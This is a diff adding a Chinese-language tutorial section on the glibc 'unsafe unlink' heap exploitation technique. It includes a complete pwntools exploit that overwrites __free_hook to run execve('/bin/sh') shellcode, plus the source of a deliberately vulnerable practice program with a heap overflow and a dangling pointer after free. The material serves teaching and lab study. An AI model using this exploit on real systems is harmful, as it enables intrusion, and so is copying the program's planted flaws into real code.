@@ -110,3 +110,265 @@ BK->fd = FD;
 
 ### unsafe unlink
 
+ 以[unsafe_unlinking](../data/unsafe_unlinking) 为例， 基本信息如下：
+
+![2022-08-08_09-49-19](unsafe_unlinking.assets/2022-08-08_09-49-19.png)
+
+在gdb下调试，基本功能如下：
+
+![2022-08-08_09-51-05](unsafe_unlinking.assets/2022-08-08_09-51-05.png)
+
+两次选择1，申请大小为0x88的内存(malloc chunk 大小为0x90)， 这时的heap布局如下：
+
+![2022-08-08_09-54-06](unsafe_unlinking.assets/2022-08-08_09-54-06.png)
+
+继续执行，选择2， 编辑第一块内存，输入大量垃圾字符：
+
+![2022-08-08_09-56-11](unsafe_unlinking.assets/2022-08-08_09-56-11.png)
+
+检测heap，发现编辑功能有溢出的现象：
+
+![2022-08-08_09-57-19](unsafe_unlinking.assets/2022-08-08_09-57-19-16599251467951.png)
+
+这时，我们可以控制 fd、bk、pre_size、fake_size, 由上内存合并述讨论知道:  
+
+> 如果fake_size的 PRE_INUSE bit（也就是最后一位）是0，free 这个chunk的时候，会触发合并和unlinking, 而这时的fd 和bk 我们能控制，a.k.a. 我们有一个任意写
+
+由于没有NX bit，一个很自然的想法是：注入shellcode到heap上执行。
+
+但如何触发呢？由于两次malloc机会都用完了，所以不能像之前那样用`__malloc_hook`触发，但还有free，故可以通过`__free_hook`触发。
+
+综上，利用的思路可以归结如下：
+
+1. 由于unlink中`FD->bk = BK;`，FD和BK我们能控制，故可以使FD->bk 为`__free_hook`的地址，而BK 为注入的shellcode的地址。unlink后， __free_hook 指向shellcode。
+2. free一下触发shellcode.
+
+利用代码如下：
+
+```python
+ #!/usr/bin/python3
+from pwn import *
+
+elf = context.binary = ELF("unsafe_unlinking")
+libc = elf.libc
+index = 0
+
+gs = '''
+continue
+'''
+def start():
+    if args.GDB:
+        return gdb.debug(elf.path, gdbscript=gs)
+    else:
+        return process(elf.path)
+
+def malloc(size):
+    global index
+    io.recvuntil("your option is: ")
+    io.timeout = 0.1
+    io.send("1")
+    io.sendafter("malloc size(hexadecimal): ", hex(size))
+    index += 1
+    return index - 1 
+
+def edit(index, data):
+    io.recvuntil("your option is: ")
+    io.timeout = 0.1
+    io.send("2")
+    io.sendafter("chunk index: ", str(index))
+    io.sendafter("input data: ", data)
+
+def free(i):
+    io.recvuntil("your option is: ")
+    io.timeout = 0.1
+    io.send("3")
+    global index
+    io.sendafter("index: ", str(i).encode())
+
+
+io = start()
+io.recvuntil("puts() @ ")
+libc.address = int(io.recvline(), 16) - libc.sym.puts
+io.recvuntil("heap @ ")
+heap = int(io.recvline(), 16)
+
+
+
+shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:"+ shellcraft.execve("/bin/sh"))
+shellcode_addr = heap + 0x20
+
+chunk_a = malloc(0x88)
+chunk_b = malloc(0x88)
+
+
+fd          = libc.sym.__free_hook - 0x18
+bk          = shellcode_addr
+prev_size    = 0x90
+fake_size   = 0x90
+
+edit(chunk_a, p64(fd) + p64(bk) + shellcode + b'a'*(0x88- len(shellcode) - 0x18) + p64(prev_size) + p64(fake_size))
+
+free(chunk_b)
+free(chunk_a)
+
+
+io.interactive()
+```
+
+一个值得注意点： 由于这里的unlink的任意写是双向写，即`FD->bk = BK;`后面还有`BK->fd = FD;`，BK是shellcode的地址，这样shellcode会被FD污染。为了绕过这种影响，这里的shellcode一开始就用了一个jump， （两个字节）中间就是一堆NOP， 即使被污染也不会影响逻辑。当然，如果不想用这种方法写shellcode，也可以把shellcode放到第二个chunk里， 这里就不展开讲.
+
+测试，确实拿到shell：
+
+![2022-08-08_11-43-38](unsafe_unlinking.assets/2022-08-08_11-43-38.png)
+
+最后附上漏洞程序的源码：
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+#include<stdbool.h>
+#include<unistd.h>
+#include<malloc.h>
+#include<stdint.h>
+
+#define NAME "unsafe unlinking\n"
+#define LINE "-------------------------------\n"
+#define MAX_MALLOC 2
+#define MIN_SIZE 120
+#define MAX_SIZE 1000
+
+// gcc --std=gnu89 -z execstack-no-pie -Wl,-rpath,../libc/glibc_2.23_unsafe-unlink/,-dynamic-linker,../libc/glibc_2.23_unsafe-unlink/ld.so.2 -g unsafe_unlinking.c -o un\
+safe_unlinking
+
+void* pointers[MAX_MALLOC];
+
+void print_banner(void) {
+    printf(NAME);
+    printf(LINE);
+}
+
+void print_leak(void) {
+    printf("puts() @ %p\n", &puts);
+    char* a = malloc(0x88);
+    printf("heap @ %p\n", a-0x10);
+    free(a);
+}
+
+void print_option(int malloc_count) {
+    printf("1) malloc %d/%d\n", malloc_count, MAX_MALLOC);
+    puts("2) edit");
+    puts("3) free");
+    puts("4) quit");
+    printf("your option is: ");
+}
+
+unsigned long read_num(void) {
+    char buf[31];
+    unsigned long num;
+    read(0, buf, 31);
+    num = strtoul(buf, 0, 10);
+    return num;
+}
+unsigned long read_num_x(void) {
+    char buf[31];
+    unsigned long num;
+    read(0, buf, 31);
+    num = strtoul(buf, 0, 0);
+    return num;
+}
+
+void do_malloc(int* malloc_count) {
+    if (*malloc_count < MAX_MALLOC){
+        printf("malloc size(hexadecimal): ");
+        unsigned long malloc_size = read_num_x();
+        if (malloc_size > MIN_SIZE && malloc_size <= MAX_SIZE){
+            char* buf = malloc(malloc_size);
+            pointers[*malloc_count] = buf;
+            *malloc_count+=1;
+        }
+        else {
+            printf("small chunks only - excluding fast sizes (0x%x < bytes <= 0x%x)\n", MIN_SIZE, MAX_SIZE);
+        }
+    }
+    else{
+        printf("Sorry, no more space for you to malloc.\n");
+    }
+    printf(LINE);
+}
+
+void do_free(void) {
+    printf("index: ");
+    unsigned long index = read_num();
+    if (index < MAX_MALLOC) {
+        void* pointer = pointers[index];
+        free(pointer);
+        printf("free %p\n", pointer);
+        // pointers[index] = NULL;
+        
+    }
+    printf(LINE);
+}
+
+void do_edit()
+{
+    printf("chunk index: ");
+    unsigned long index = read_num();
+    if (index < MAX_MALLOC) {
+        void* buf = pointers[index];
+        if (buf != NULL) {
+            printf("input data: ");
+            read(0, buf, 3*0x3f0);
+            // gets(buf);
+        }
+        else {
+            printf("invalide index\n");
+            printf(LINE);
+        }
+    }
+    else{
+        printf("invalide index\n");
+        printf(LINE);
+    }
+}
+
+void do_exit(void) {
+    printf("exiting...\n");
+    printf(LINE);
+    exit(0);
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf(LINE);
+    print_banner();
+    print_leak();
+    printf(LINE);
+
+    int malloc_count = 0;
+    print_option(malloc_count);
+    unsigned long option_num;
+    option_num = read_num();
+    while (true) {
+        switch (option_num) {
+            case 1:
+                do_malloc(&malloc_count);
+                break;
+            case 2:
+                do_edit();
+                break;
+            case 3:
+                do_free();
+                break;
+            case 4:
+                do_exit();
+                break;
+        }   
+        print_option(malloc_count); 
+        option_num = read_num();
+        printf(LINE);
+    }
+    return 0;
+}
+
+```
+
